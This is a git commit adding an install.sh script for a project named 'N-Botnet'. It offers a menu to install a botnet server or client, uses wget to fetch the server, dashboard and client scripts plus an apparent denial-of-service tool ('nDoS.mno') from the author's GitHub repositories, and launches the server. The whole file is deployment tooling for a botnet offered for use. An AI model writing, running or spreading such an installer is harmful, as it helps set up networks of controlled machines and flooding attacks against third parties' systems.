da16ff352a3bc3d6aca09744af930c2304311c25
anhnoine <anhnoine@outlook.com>
2026-07-16 21:46:56 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,33 @@
+#!/usr/bin/env bash
+clear
+apt update
+apt install python3
+clear
+
+echo "N-Botnet"
+echo ""
+echo "1. Install Botnet Server"
+echo "2. Install Botnet Client"
+echo ""
+
+read -p "Enter your choice: " choice
+
+if [ "$choice" = "1" ]; then
+    clear
+    echo "Installing Botnet Server"
+    wget http://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/server/server.py
+    wget https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/server/dashboard.html
+    clear
+    echo "You can change server ip, port and password in: server.py"
+    python3 server.py
+elif [ "$choice" = "2" ]; then
+    clear
+    echo "Installing Botnet Client"
+    wget https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/client/client.py
+    wget https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/tools/nDoS.mno
+    clear
+    echo "You can change in: client.py"
+else
+    clear
+    echo "Try again?"
+fi
